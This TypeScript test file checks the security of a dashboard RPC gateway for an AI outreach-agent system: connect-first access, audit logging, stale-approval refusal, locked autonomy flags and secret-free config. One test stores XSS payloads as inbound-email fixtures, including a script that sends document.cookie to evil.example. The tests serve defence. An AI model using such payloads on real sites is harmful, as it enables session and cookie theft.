// GTM-agents: the dashboard's RPC is default-deny and never a second path around a gate. Nothing but
// connect and health runs before connect; identity never comes from params; every mutation writes an
// audit row; an approval on content that changed after it was shown is refused; flags.set keeps
// autonomy and the permanently human-only cap out of reach; config.get carries no secret; and text
// from outside comes back as the same plain string. Every person, company and message is invented.
import type { Env } from "@gtm-agents/core";
import { createProposal } from "@gtm-agents/core/autonomy/runtime";
import { createJobRegistry } from "@gtm-agents/core/jobs";
import { CLOSE, MUTATING_METHODS, RATE_LIMITS, dashboardEnabled, handleFrame, socketGate, type ConnectionState, type GatewayContext, type GatewayWiring, type ServerEvent } from "@gtm-agents/core/gateway";
import { replyTestConfig, seedReplyContact } from "@gtm-agents/core/replies/testing";
import { flagsOf } from "./helpers.ts";
import { env } from "cloudflare:workers";
import { beforeEach, describe, expect, it } from "vitest";
import { MemoryKv, uid } from "./helpers.ts";

const db = env.DB;
const EMAIL = "ops@acme.example";
const ACTOR = `operator:${EMAIL}`;
const admin = { accessTeamDomain: "acme.cloudflareaccess.com", accessAud: "a".repeat(64), allowedEmails: [EMAIL], allowedOrigins: [] };
const config = replyTestConfig({ admin });
const SECRET = "k".repeat(48);

interface Harness {
  ctx: GatewayContext;
  kv: MemoryKv;
  events: ServerEvent[];
  call(method: string, params?: unknown): Promise<{ result?: unknown; error?: { code: string; message: string }; close?: { code: number } }>;
}

function harness(options: { connected?: boolean; envExtra?: Record<string, unknown>; expiresAt?: number } = {}): Harness {
  const kv = new MemoryKv();
  kv.map.set("admin:enabled", "true");
  const events: ServerEvent[] = [];
  const wiring: GatewayWiring = { config, registry: () => createJobRegistry([]), lifecycle: true, agent: {}, extensions: {} };
  const state: ConnectionState = { email: EMAIL, sub: "user-1", expiresAt: options.expiresAt ?? Date.now() + 3_600_000, connected: options.connected ?? true, subscribed: false, rl: { start: Date.now(), requests: 0, mutations: 0, chats: 0 } };
  const bindings = { DB: db, KV: kv, GATEWAY_TOKEN: SECRET, UNSUBSCRIBE_SIGNING_KEY: SECRET, PRODUCT_WEBHOOK_SECRET: SECRET, MAIL_PUSH_SECRET: SECRET, ...options.envExtra } as unknown as Env;
  const ctx: GatewayContext = {
    env: bindings,
    wiring,
    state,
    now: () => new Date(),
    actor: ACTOR,
    flags: flagsOf(kv),
    push: (e) => events.push(e),
    broadcast: (e) => events.push(e),
    defer: () => undefined,
    turns: new Map(),
    audit: {},
  };
  let n = 0;
  return {
    ctx,
    kv,
    events,
    async call(method, params) {
      const outcome = await handleFrame(JSON.stringify({ id: `r${(n += 1)}`, method, params }), ctx);
      if (outcome.close) return { close: outcome.close };
      return JSON.parse(outcome.reply ?? "{}") as { result?: unknown; error?: { code: string; message: string } };
    },
  };
}

async function auditRows(action: string): Promise<Array<{ details: string }>> {
  const { results } = await db.prepare("SELECT details FROM audit_log WHERE agent_id = ?1 AND action = ?2 ORDER BY id").bind(ACTOR, action).all<{ details: string }>();
  return results;
}

async function seedDraft(input: { kind?: string; body?: string; subject?: string; to?: string } = {}): Promise<string> {
  const id = uid("dr");
  await db
    .prepare("INSERT INTO drafts (id, kind, recipient_email, subject, body, status) VALUES (?1, ?2, ?3, ?4, ?5, 'pending_approval')")
    .bind(id, input.kind ?? "warm_intro", input.to ?? "jane@globex.example", input.subject ?? "Flaky builds", input.body ?? "Hi Jane,\n\nA short note.\n\nAvery")
    .run();
  return id;
}

beforeEach(async () => {
  await db.prepare("DELETE FROM audit_log").run();
});

describe("connect comes first", () => {
  it("refuses everything but connect and health before connect", async () => {
    const h = harness({ connected: false });
    expect((await h.call("status")).error?.code).toBe("unauthenticated");
    expect((await h.call("drafts.approve", { draftId: "x", shownDigest: "0".repeat(64) })).error?.code).toBe("unauthenticated");
    expect((await h.call("health")).result).toMatchObject({ ok: true });
    expect((await h.call("connect", { protocolVersion: 99 })).error?.code).toBe("invalid");
    expect((await h.call("status")).error?.code).toBe("unauthenticated");
    const connected = await h.call("connect", { protocolVersion: 1 });
    expect(connected.result).toMatchObject({ operator: { email: EMAIL } });
    expect((await h.call("status")).result).toMatchObject({ halted: false });
  });

  it("takes the identity from the connection, never from params", async () => {
    const h = harness({ connected: false });
    expect((await h.call("connect", { protocolVersion: 1, email: "intruder@globex.example" })).error?.code).toBe("invalid");
    await h.call("connect", { protocolVersion: 1 });
    const draftId = await seedDraft();
    expect((await h.call("drafts.reject", { draftId, approvedBy: "intruder@globex.example" })).error?.code).toBe("invalid");
    expect((await h.call("unknown.method")).error?.code).toBe("invalid");
  });

  it("closes the socket once the Access token has expired, or the email leaves the allowlist", async () => {
    expect((await harness({ expiresAt: Date.now() - 1 }).call("status")).close?.code).toBe(4001);
    const h = harness();
    h.ctx.state.email = "intruder@globex.example";
    expect((await h.call("status")).close?.code).toBe(4003);
  });

  it("closes open sockets once admin:enabled is turned off or cannot be read", async () => {
    const h = harness();
    h.kv.map.delete("admin:enabled");
    expect((await h.call("status")).close?.code).toBe(4003);
    const broken = harness();
    broken.kv.failingKeys.add("admin:enabled");
    expect((await broken.call("status")).close?.code).toBe(4003);
  });

  it("rate-limits each connection and closes it far over the limit", async () => {
    const h = harness();
    for (let i = 0; i < RATE_LIMITS.requests; i++) await h.call("contacts.stats");
    expect((await h.call("contacts.stats")).error?.code).toBe("rate_limited");
    let closed: number | undefined;
    for (let i = 0; i < RATE_LIMITS.requests * 2 && closed === undefined; i++) closed = (await h.call("contacts.stats")).close?.code;
    expect(closed).toBe(1008);
  });
});

describe("mutations", () => {
  const Z = "0".repeat(64);
  const params: Record<string, unknown> = {
    "chat.send": { text: "hello" },
    "chat.abort": { turnId: "t-1" },
    "cockpit.pause": { reason: "checking the bounce rate" },
    "cockpit.resume": {},
    "cockpit.drain": { reason: "checking the queue" },
    "cockpit.replay": {},
    "pipeline.create": { contactId: "ct-missing" },
    "pipeline.update": { dealId: "dl-missing", value: 10 },
    "pipeline.transition": { dealId: "dl-missing", to: "engaged" },
    "contacts.update": { id: "ct-missing", patch: { notes: "met at a conference" } },
    "inbound.action": { id: "in-missing", action: "done" },
    "inbound.draftSend": { draftId: "dr-missing", shownDigest: Z },
    "drafts.approve": { draftId: "dr-missing", shownDigest: Z },
    "drafts.reject": { draftId: "dr-missing" },
    "proposals.approve": { id: "experiment:missing", shownDigest: Z },
    "proposals.reject": { id: "experiment:missing" },
    "flags.set": { key: "cold_batch:enabled", value: "false" },
  };

  it("every mutating method writes an audit row, whatever its outcome", async () => {
    expect(Object.keys(params).sort()).toEqual([...MUTATING_METHODS].sort());
    for (const method of MUTATING_METHODS) {
      const h = harness();
      await h.call(method, params[method]);
      const rows = await auditRows(`dashboard.${method}`);
      expect(rows.length, method).toBe(1);
      expect(JSON.parse(rows[0]?.details ?? "{}")).toHaveProperty("outcome");
    }
  });

  it("refuses a draft approval on content that changed after it was shown", async () => {
    const h = harness();
    const draftId = await seedDraft();
    const listed = (await h.call("drafts.list")).result as { items: Array<{ id: string; digest: string }> };
    const shown = listed.items.find((d) => d.id === draftId);
    expect(shown?.digest).toMatch(/^[0-9a-f]{64}$/);
    await db.prepare("UPDATE drafts SET body = ?2 WHERE id = ?1").bind(draftId, "Hi Jane,\n\nA different note with a discount.\n\nAvery").run();
    const stale = await h.call("drafts.approve", { draftId, shownDigest: shown?.digest });
    expect(stale.error?.code).toBe("conflict");
    expect((await db.prepare("SELECT status FROM drafts WHERE id = ?1").bind(draftId).first<{ status: string }>())?.status).toBe("pending_approval");
    expect(JSON.parse((await auditRows("dashboard.drafts.approve"))[0]?.details ?? "{}")).toMatchObject({ outcome: "conflict", draftId });

    // A digest the server never showed is refused too, even when it matches the content.
    const again = (await h.call("drafts.list")).result as { items: Array<{ id: string; digest: string }> };
    const fresh = again.items.find((d) => d.id === draftId);
    h.kv.map.delete(`approval:shown:${draftId}`);
    expect((await h.call("drafts.approve", { draftId, shownDigest: fresh?.digest })).error?.code).toBe("conflict");

    await h.call("drafts.list");
    expect((await h.call("drafts.approve", { draftId, shownDigest: fresh?.digest })).result).toMatchObject({ status: "approved" });
    const row = await db.prepare("SELECT status, approved_by, approved_digest FROM drafts WHERE id = ?1").bind(draftId).first<{ status: string; approved_by: string; approved_digest: string }>();
    expect(row).toMatchObject({ status: "approved", approved_by: ACTOR, approved_digest: fresh?.digest });
  });

  it("never approves or rejects a lifecycle follow-up through the generic path: it belongs to fu-approve and fu-reject", async () => {
    const h = harness();
    const draftId = await seedDraft({ kind: "lifecycle" });
    const listed = (await h.call("drafts.list", { kind: "lifecycle" })).result as { items: Array<{ id: string; digest: string }> };
    const shown = listed.items.find((d) => d.id === draftId);
    const refused = await h.call("drafts.approve", { draftId, shownDigest: shown?.digest });
    expect(refused.error?.code).toBe("invalid");
    expect(refused.error?.message).toContain("fu-approve");
    const notRejected = await h.call("drafts.reject", { draftId, reason: "not now" });
    expect(notRejected.error?.code).toBe("invalid");
    expect(notRejected.error?.message).toContain("fu-reject");
    expect((await db.prepare("SELECT status FROM drafts WHERE id = ?1").bind(draftId).first<{ status: string }>())?.status).toBe("pending_approval");
  });

  it("refuses to send a reply draft on a stale digest, before anything is sent", async () => {
    const h = harness();
    h.kv.map.set("replies:send_enabled", "true");
    const contact = await seedReplyContact(db, { email: `jane.${uid("x")}@globex.example` });
    const draftId = await seedDraft({ kind: "reply", to: contact.email, subject: "Re: Flaky builds" });
    const inboundId = uid("in");
    await db
      .prepare("INSERT INTO inbound_emails (id, provider, provider_message_id, sender_email, subject, body_preview, received_at, contact_id, draft_id, status) VALUES (?1, 'test', ?1, ?2, 'Flaky builds', 'Can we talk?', ?3, ?4, ?5, 'draft_created')")
      .bind(inboundId, contact.email, new Date().toISOString(), contact.id, draftId)
      .run();
    const listed = (await h.call("inbound.list")).result as { items: Array<{ id: string; draft?: { id: string; digest: string } }> };
    const digest = listed.items.find((i) => i.id === inboundId)?.draft?.digest;
    expect(digest).toMatch(/^[0-9a-f]{64}$/);
    await db.prepare("UPDATE drafts SET subject = 'Re: Flaky builds (updated)' WHERE id = ?1").bind(draftId).run();
    expect((await h.call("inbound.draftSend", { draftId, shownDigest: digest })).error?.code).toBe("conflict");
    expect((await db.prepare("SELECT status FROM drafts WHERE id = ?1").bind(draftId).first<{ status: string }>())?.status).toBe("pending_approval");
  });

  it("refuses a proposal approval when the proposal changed after it was shown", async () => {
    const h = harness();
    const id = uid("xp");
    await db
      .prepare("INSERT INTO experiment_proposals (id, kind, target, current, proposed, reason, prediction, status) VALUES (?1, 'holdout_rate', 'outreach:holdout_rate', '', '0.1', 'more control', 'a cleaner read', 'pending')")
      .bind(id)
      .run();
    const listed = (await h.call("proposals.list", { source: "experiment" })).result as Array<{ id: string; digest: string }>;
    const shown = listed.find((p) => p.id === `experiment:${id}`);
    expect(shown).toBeDefined();
    await db.prepare("UPDATE experiment_proposals SET proposed = '0.2' WHERE id = ?1").bind(id).run();
    expect((await h.call("proposals.approve", { id: shown?.id, shownDigest: shown?.digest })).error?.code).toBe("conflict");
    expect(h.kv.map.has("outreach:holdout_rate")).toBe(false);
    const again = ((await h.call("proposals.list", { source: "experiment" })).result as Array<{ id: string; digest: string }>).find((p) => p.id === `experiment:${id}`);
    expect((await h.call("proposals.approve", { id: again?.id, shownDigest: again?.digest })).result).toMatchObject({ status: "applied" });
    expect(h.kv.map.get("outreach:holdout_rate")).toBe("0.2");
  });

  it("rejects an autonomy proposal by dismissing it: no level changes, it can never be confirmed, and only a pending one can be rejected", async () => {
    const h = harness();
    const proposal = await createProposal(db, { actionClass: "reply_send", from: 1, to: 2, origin: "review", basedOnChange: 0, requestedBy: "system:autonomy_review", ttlMs: 3_600_000, now: new Date() });
    const listed = (await h.call("proposals.list", { source: "autonomy" })).result as Array<{ id: string; digest: string; confirmCode?: string }>;
    const shown = listed.find((p) => p.id === `autonomy:${proposal.id}`);
    expect(shown?.confirmCode).toBe(proposal.code);
    expect((await h.call("proposals.reject", { id: shown?.id, reason: "not yet" })).result).toEqual({ ok: true });
    const row = await db.prepare("SELECT status, decided_by, detail FROM autonomy_proposals WHERE id = ?1").bind(proposal.id).first();
    expect(row).toEqual({ status: "refused", decided_by: ACTOR, detail: "dismissed: not yet" });
    const audit = await db.prepare("SELECT agent_id FROM audit_log WHERE action = 'autonomy.proposal_dismissed' AND details LIKE ?1").bind(`%${proposal.id}%`).all();
    expect(audit.results).toEqual([{ agent_id: ACTOR }]);

    const approved = await h.call("proposals.approve", { id: shown?.id, shownDigest: shown?.digest, confirmCode: proposal.code });
    expect(approved.result).toMatchObject({ status: "refused" });
    expect((await h.call("proposals.reject", { id: shown?.id })).error?.code).toBe("conflict");
    expect([...h.kv.map.keys()].some((k) => k.startsWith("autonomy:"))).toBe(false);
    expect(await db.prepare("SELECT COUNT(*) AS n FROM autonomy_level_changes WHERE proposal_id = ?1").bind(proposal.id).first()).toEqual({ n: 0 });
    expect(((await h.call("proposals.list", { source: "autonomy" })).result as Array<{ id: string }>).some((p) => p.id === shown?.id)).toBe(false);
  });
});

describe("flags.set", () => {
  it("refuses a permanently human-only class above 1 and every autonomy key", async () => {
    const h = harness();
    const human = await h.call("flags.set", { key: "autonomy:pricing_billing_auth", value: "2" });
    expect(human.error?.code).toBe("forbidden");
    expect(human.error?.message).toContain("permanently human-only");
    expect((await h.call("flags.set", { key: "autonomy:data_deletion", value: "1" })).error?.code).toBe("forbidden");
    expect((await h.call("flags.set", { key: "autonomy:reply_send", value: "2" })).error?.code).toBe("forbidden");
    expect((await h.call("flags.set", { key: "autonomy:reply_send", value: null })).error?.code).toBe("forbidden");
    expect([...h.kv.map.keys()].some((k) => k.startsWith("autonomy:"))).toBe(false);
  });

  it("refuses the kill switch keys, state flags, patterns and unknown keys, and checks values", async () => {
    const h = harness();
    for (const key of ["system:halt", "outreach:cold-pause", "outreach:cold-pause:critical", "delivery:breaker:2026-11-04", "experiments:template_weight:intro", "budget:job:<job>:daily_cents", "not:a_flag"]) {
      expect((await h.call("flags.set", { key, value: "true" })).error?.code, key).toBe("forbidden");
    }
    expect((await h.call("flags.set", { key: "outreach:holdout_rate", value: "0.5" })).error?.code).toBe("forbidden");
    expect((await h.call("flags.set", { key: "cold_batch:enabled", value: "on" })).result).toEqual({ ok: true, value: "true" });
    expect(h.kv.map.get("cold_batch:enabled")).toBe("true");
    expect((await h.call("flags.set", { key: "cold_batch:enabled", value: null })).result).toEqual({ ok: true, value: null });
    expect(h.kv.map.has("cold_batch:enabled")).toBe(false);
  });
});

describe("what comes back", () => {
  it("config.get carries no secret value", async () => {
    const h = harness();
    const result = (await h.call("config.get")).result as { secrets: Record<string, boolean> };
    expect(JSON.stringify(result)).not.toContain(SECRET);
    expect(JSON.stringify(result)).not.toContain(admin.accessAud);
    expect(result.secrets.GATEWAY_TOKEN).toBe(true);
    const audit = (await h.call("security.audit")).result as Array<{ detail: string }>;
    expect(JSON.stringify(audit)).not.toContain(SECRET);
  });

  it("returns outside text as the same plain string", async () => {
    const h = harness();
    const subject = `<img src=x onerror="alert(1)"> Re: pricing & "terms"`;
    const preview = "<script>document.location='https://evil.example/'+document.cookie</script> &amp; thanks";
    const inboundId = uid("in");
    await db
      .prepare("INSERT INTO inbound_emails (id, provider, provider_message_id, sender_email, subject, body_preview, received_at, status) VALUES (?1, 'test', ?1, 'mallory@globex.example', ?2, ?3, ?4, 'ignored')")
      .bind(inboundId, subject, preview, new Date(Date.now() + 60_000).toISOString())
      .run();
    const listed = (await h.call("inbound.list", { status: "ignored" })).result as { items: Array<{ id: string; subject: unknown; preview: unknown; from: unknown }> };
    const item = listed.items.find((i) => i.id === inboundId);
    expect(item?.subject).toBe(subject);
    expect(item?.preview).toBe(preview);
    expect(typeof item?.from).toBe("string");
  });
});

describe("the socket gate, checked on every frame and before every activity push", () => {
  const now = Date.now();
  const live = { email: EMAIL, expiresAt: now + 60_000 };

  it("admits an allowlisted operator inside the Access session while the dashboard is on", () => {
    expect(socketGate(admin, live, true, now)).toBeNull();
    expect(socketGate(admin, { ...live, email: EMAIL.toUpperCase() }, true, now)).toBeNull();
  });

  it("closes a quiet socket once the switch is off, the email leaves the allowlist, or the session expires", () => {
    expect(socketGate(admin, live, false, now)?.code).toBe(CLOSE.forbidden);
    expect(socketGate({ ...admin, allowedEmails: ["someone@acme.example"] }, live, true, now)?.code).toBe(CLOSE.forbidden);
    expect(socketGate(admin, { ...live, expiresAt: now }, true, now)?.code).toBe(CLOSE.expired);
    expect(socketGate(undefined, live, true, now)?.code).toBe(CLOSE.forbidden);
    expect(socketGate(admin, null, true, now)?.code).toBe(CLOSE.forbidden);
  });

  it("reads the switch as off when it is unset or cannot be read", async () => {
    const kv = new MemoryKv();
    expect(await dashboardEnabled(flagsOf(kv))).toBe(false);
    kv.map.set("admin:enabled", "true");
    expect(await dashboardEnabled(flagsOf(kv))).toBe(true);
    kv.failingKeys.add("admin:enabled");
    expect(await dashboardEnabled(flagsOf(kv))).toBe(false);
  });
});
